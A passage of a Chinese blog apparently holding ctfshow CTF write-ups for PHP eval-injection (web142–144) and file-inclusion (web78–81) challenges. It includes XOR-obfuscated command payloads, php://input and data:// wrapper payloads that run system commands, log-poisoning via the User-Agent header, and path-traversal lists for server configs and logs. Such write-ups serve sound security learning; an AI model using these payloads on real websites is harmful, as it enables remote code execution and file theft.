class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个脚本可以保存下来，基本是通用的。输入想要的指令即可</p><p><img src="/images/image-20210607181216096.png"></p><p>本题中v1，v2填随意数字，v3就result即可，但注意的是这里有个return干扰，所以我们要在v3的payload前边和后面加上一些字符就可以执行命令，例如<code>\+ - *</code> 等等</p><p>最后使用命令system(“tac flag.php”);即可得到flag</p><h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-17 19:36:02*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$v1</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接传一个0即可，传0的话0会被is_numeric识别为二进制进而可以进入if，也可以传0x0，这样是十六进制，查看源码即可得到flag</p><h3 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-18 12:48:14*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和141类似，只是多ban掉了一些特殊字符，但没有ban^，也即取异或，所以直接用141的脚本，稍微改一下正则限制即可</p><p><img src="/images/image-20210607183743506.png" alt="image-20210607183743506"></p><p>注意过滤了分号，所以最后的payload形式：</p><pre class="line-numbers language-none"><code class="language-none">v3&#x3D;*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%20%60%60%60%60%2f%7f%60%7f&quot;)*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-18 16:21:15*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">1</span><span class="token operator">?</span><span class="token constant boolean">true</span><span class="token punctuation">:</span><span class="token constant boolean">false</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和141一样，只是换成了v2，没什么差别</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web入门-文件包含wp</title>
      <link href="/2021/01/29/ctfshow-web-ru-men-wen-jian-bao-han-wp/"/>
      <url>/2021/01/29/ctfshow-web-ru-men-wen-jian-bao-han-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含wp"><a href="#文件包含wp" class="headerlink" title="文件包含wp"></a>文件包含wp</h1><p>在开始前先简单回顾文件包含漏洞原理及利用</p><h2 id="文件包含原理及基本利用"><a href="#文件包含原理及基本利用" class="headerlink" title="文件包含原理及基本利用"></a>文件包含原理及基本利用</h2><p>在开发时一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。如果我们包含的参数没有被严格的过滤，当被包含恶意文件时，就会产生漏洞。</p><p>在php中产生文件包含漏洞的函数主要有四个</p><pre class="line-numbers language-none"><code class="language-none">include()include_once()require()require_once()include()和require()的区别：require()如果在包含过程中出错，就会直接退出，不执行后续语句require()如果在包含过程中出错，只会提出警告，但不影响后续语句的执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于其对于包含文件的位置的查找方式，详见PHP文档：<a href="https://www.php.net/manual/zh/function.include.php">include文档</a>,这里只用知道他是干什么的就好了，</p><p>通过include文档可以看到：</p><p><img src="/images/image-20201214214256272.png"></p><p>文件包含支持封装协议，也就是说，我们可以通过在url中使用这些封装协议来完成更多的事情，这其中也就存在了很多的可以进行攻击的点</p><ul><li>这是一方面，php伪协议的利用</li></ul><p><a href="https://www.php.net/manual/zh/wrappers.php">支持的协议和封装协议</a> （文档）</p><blockquote><ul><li><a href="https://www.php.net/manual/zh/wrappers.file.php">file://</a> — 访问本地文件系统</li><li><a href="https://www.php.net/manual/zh/wrappers.http.php">http://</a> — 访问 HTTP(s) 网址</li><li><a href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp://</a> — 访问 FTP(s) URLs</li><li><a href="https://www.php.net/manual/zh/wrappers.php.php">php://</a> — 访问各个输入/输出流（I/O streams）</li><li><a href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a> — 压缩流</li><li><a href="https://www.php.net/manual/zh/wrappers.data.php">data://</a> — 数据（RFC 2397）</li><li><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a> — 查找匹配的文件路径模式</li><li><a href="https://www.php.net/manual/zh/wrappers.phar.php">phar://</a> — PHP 归档</li><li><a href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2://</a> — Secure Shell 2</li><li><a href="https://www.php.net/manual/zh/wrappers.rar.php">rar://</a> — RAR</li><li><a href="https://www.php.net/manual/zh/wrappers.audio.php">ogg://</a> — 音频流</li><li><a href="https://www.php.net/manual/zh/wrappers.expect.php">expect://</a> — 处理交互式的流</li></ul></blockquote><p>这里有一个前人总结的部分方法：</p><p><img src="/images/image-20210114181853207.png"></p><p>一般来说就是这些进行利用，具体的应用以题目为例子来进行记录</p><ul><li><p>包含日志</p></li><li><p>日志文件污染是通过将注入目标系统的代码写入到日志文件中。通常，访问目标系统上的某些对外开放的服务时，系统会自动将访问记录写入到日志文件中，利用这个机制，有可能会将代码写入到日志中。例如，当我们请求一个url地址时，便会记录在access.log中，但如果访问一个不存在的页面，便会将这个页面写入access.log中。如访问URL:<a href="http://www.xxx.com/">www.xxx.com</a><?phpinfo();?>则会将一句话写入到access.log中，但是一般来说，<strong>写入到access.log文件中的一句话是被编码的，所以需要抓包绕过</strong>，而且利用此漏洞需要知道access.log的地址，不然便没有。</p></li><li><p><strong>注意</strong> (1)除了我们包含 access.log 以外，我们还可以制造错误，然后包含 error.log (2)如果出现包含不成功的情况，很有可能就是被 open_base_dir() 限制了 (3)实战中最好在凌晨的时候进行包含，要不然日志太大包含会失败 (4)除了 apache 和 nginx 的日志 还有很多其他的日志我们能利用，比如说 ssh 的日志</p><p>常见的路径还有以下这些:</p><pre class="line-numbers language-aaa" data-language="aaa"><code class="language-aaa">?file&#x3D;.htaccess    &#x2F;&#x2F;包含同目录下的文件?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;locate.db?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db    &#x2F;&#x2F;linux中这两个文件储存着所有文件的路径，需要root权限?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;apache&#x2F;error.log    &#x2F;&#x2F;包含错误日志?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf    &#x2F;&#x2F;获取web目录或者其他配置文件?file&#x3D;..&#x2F;attachment&#x2F;media&#x2F;xxx.file    &#x2F;&#x2F;包含上传的附件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>来源:<a href="https://www.v0n.top/2019/09/13/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">博客</a></p></li></ul><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 10:52:43# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 10:54:20# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有进行任何的过滤，用上述协议都试一试</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter:http:&#x2F;&#x2F;718ef649-54c6-4ab7-83e5-51476fec8117.chall.ctf.show&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>发现可以，再将index.php改为flag.php即可拿到base64编码的flag.php进行解码即可。</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;input:http:&#x2F;&#x2F;718ef649-54c6-4ab7-83e5-51476fec8117.chall.ctf.show&#x2F;?file&#x3D;php:&#x2F;&#x2F;inputpost------&lt;?php phpinfo();    &lt;?php phpinfo()?&gt;执行失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这个方法失败，</p><pre class="line-numbers language-none"><code class="language-none">data:&#x2F;&#x2F;http:&#x2F;&#x2F;718ef649-54c6-4ab7-83e5-51476fec8117.chall.ctf.show&#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo();?&gt;http:&#x2F;&#x2F;718ef649-54c6-4ab7-83e5-51476fec8117.chall.ctf.show&#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php show_source(&#39;flag.php&#39;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>成功</p><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:10:14# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 11:12:38# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上一道的基础上对php进行了过滤，php会被???进行替换，使用data协议进行base64编码后可得</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;9dcd379c-a3ee-40f8-a045-c23d9057bc9c.chall.ctf.show&#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc2hvd19zb3VyY2UoJ2ZsYWcucGhwJyk7其中base64编码对应的是-------&lt;?php show_source(&#39;flag.php&#39;);最开始用&lt;?php show_source(&#39;flag.php&#39;);?&gt;输出错误，因为后面的?&gt;没有被闭合，所以会有错误使用&lt;?php show_source(&#39;flag.php&#39;);?&gt;&lt;?php 将其闭合也可以<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>尝试使用compress.bzip协议进行一次</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;9dcd379c-a3ee-40f8-a045-c23d9057bc9c.chall.ctf.show&#x2F;?file&#x3D;compress.bzip2:&#x2F;&#x2F;.&#x2F;flag.bz2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>错误，不知道是我的问题还是这题不让这样做，先放一放。</p><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 11:26:29# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对php和data都进行了过滤，不再能使用上述协议进行，包含日志文件进行查看，首先先进行一个请求</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;47d4d5fc-b41c-49f1-b564-6f55ae480f18.chall.ctf.show&#x2F;&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>注意，这样上传会被编码，需要进行抓包绕过,将其放入UA头，也可以达到效果，后面就是这样做的</strong></p><p><img src="/images/image-20210130152900778.png"></p><p>传phpinfo成功，getshell成功，先ls，可以看到flag在fl0g.php，</p><p><img src="/images/image-20210130153045288.png" alt="image-20210130153045288"></p><p>得到flag</p><p>在网上看到了另一种解法：</p><pre class="line-numbers language-none"><code class="language-none">payload：?file&#x3D;Php:&#x2F;&#x2F;POST：&lt;?php system(&#39;cat fl*&#39;);?这里用hackbar无法传入，可以用burpsuite<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有进行实验，但应该是没问题的</p><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 15:51:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" 